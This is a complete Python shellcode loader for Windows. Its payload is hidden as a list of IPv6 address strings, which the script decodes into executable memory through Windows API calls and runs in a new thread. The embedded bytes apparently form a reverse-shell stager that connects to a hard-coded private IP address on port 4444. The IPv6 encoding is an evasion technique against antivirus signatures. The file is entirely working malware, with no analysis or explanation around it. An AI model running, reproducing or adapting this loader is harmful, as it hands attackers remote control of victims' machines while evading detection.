import ctypes

ipv6_list = [b'fc48:83e4:f0e8:cc00:0:4151:4150:5248', b'31d2:5156:6548:8b52:6048:8b52:1848:8b52', b'2048:fb7:4a4a:488b:7250:4d31:c948:31c0', b'ac3c:617c:22c:2041:c1c9:d41:1c1:e2ed', b'5241:5148:8b52:208b:423c:4801:d066:8178', b'180b:20f:8572:0:8b:8088:0:48', b'85c0:7467:4801:d044:8b40:2049:1d0:508b', b'4818:e356:48ff:c941:8b34:8848:1d6:4d31', b'c948:31c0:41c1:c90d:ac41:1c1:38e0:75f1', b'4c03:4c24:845:39d1:75d8:5844:8b40:2449', b'1d0:6641:8b0c:4844:8b40:1c49:1d0:418b', b'488:4158:4158:4801:d05e:595a:4158:4159', b'415a:4883:ec20:4152:ffe0:5841:595a:488b', b'12e9:4bff:ffff:5d49:be77:7332:5f33:3200', b'41:5649:89e6:4881:eca0:100:49:89e5', b'49bc:200:115c:c0a8:180:4154:4989:e44c', b'89f1:41ba:4c77:2607:ffd5:4c89:ea68:101', b'0:5941:ba29:806b:ff:d56a:a41:5e50', b'504d:31c9:4d31:c048:ffc0:4889:c248:ffc0', b'4889:c141:baea:fdf:e0ff:d548:89c7:6a10', b'4158:4c89:e248:89f9:41ba:99a5:7461:ffd5', b'85c0:740a:49ff:ce75:e5e8:9300:0:4883', b'ec10:4889:e24d:31c9:6a04:4158:4889:f941', b'ba02:d9c8:5fff:d583:f800:7e55:4883:c420', b'5e89:f66a:4041:5968:10:0:4158:4889', b'f248:31c9:41ba:58a4:53e5:ffd5:4889:c349', b'89c7:4d31:c949:89f0:4889:da48:89f9:41ba', b'2d9:c85f:ffd5:83f8:7d:2858:4157:5968', b'40:0:4158:6a00:5a41:ba0b:2f0f:30ff', b'd557:5941:ba75:6e4d:61ff:d549:ffce:e93c', b'ffff:ff48:1c3:4829:c648:85f6:75b4:41ff', b'e758:6a00:5949:c7c2:f0b5:a256:ffd5:0']

ipv6_list2 = []
for i in range(len(ipv6_list)):
    ipv6_list2.append(ctypes.string_at(ipv6_list[i]))

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_int64
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(ipv6_list2) * 16, 0x3000, 0x40)
rwxpage = ptr

for i in range(len(ipv6_list2)):
    ctypes.windll.Ntdll.RtlIpv6StringToAddressA(ipv6_list2[i], ipv6_list2[i], ctypes.c_int64(rwxpage))
    rwxpage += 16

# ctypes.windll.kernel32.VirtualProtect(ctypes.c_int64(ptr), len(ipv6_list2) * 16, 0x40)

handler = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_int64(ptr), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handler, -1)
